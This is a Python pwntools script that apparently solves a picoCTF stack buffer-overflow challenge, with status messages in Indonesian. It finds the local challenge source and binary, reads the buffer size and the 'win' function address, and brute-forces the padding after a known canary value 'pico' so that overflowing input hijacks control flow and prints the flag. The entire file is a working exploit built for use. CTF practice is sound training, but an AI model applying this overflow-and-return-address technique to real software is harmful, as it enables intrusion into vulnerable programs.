from pwn import *
from pathlib import Path
import re

context.log_level = "error"

def find_files():
    files = []

    for cfile in Path(".").glob("*.c"):
        text = cfile.read_text(errors="ignore")

        if "BUFSIZE" in text and "win" in text and "canary" in text:
            binfile = Path("./" + cfile.stem)

            if binfile.exists():
                files.append((cfile.stat().st_mtime, cfile, binfile, text))

    files.sort(reverse=True)

    if not files:
        print("[-] File hasil ./start belum ketemu / sudah expired.")
        exit()

    return files[0][1], files[0][2], files[0][3]


src, binary, source = find_files()

bufsize = int(re.search(r"#define\s+BUFSIZE\s+(\d+)", source).group(1))

elf = ELF(str(binary))
win = elf.symbols["win"]

print(f"[+] Source : {src}")
print(f"[+] Binary : {binary}")
print(f"[+] BUFSIZE: {bufsize}")
print(f"[+] win    : {hex(win)}")

canary = b"pico"

for pad in range(0, 80):
    payload  = b"A" * bufsize
    payload += canary
    payload += b"B" * pad
    payload += p32(win) * 20

    try:
        p = process(str(binary))

        data = p.recv(timeout=0.5)

        p.sendline(str(len(payload)).encode())

        data += p.recv(timeout=0.5)

        p.sendline(payload)

        out = p.recvall(timeout=1)

        if b"picoCTF{" in out:
            print(out.decode(errors="ignore"))
            print(f"[+] SUCCESS pad={pad}")
            break

        p.close()

    except Exception:
        pass
else:
    print("[-] Belum berhasil. Coba cek source .c manual.")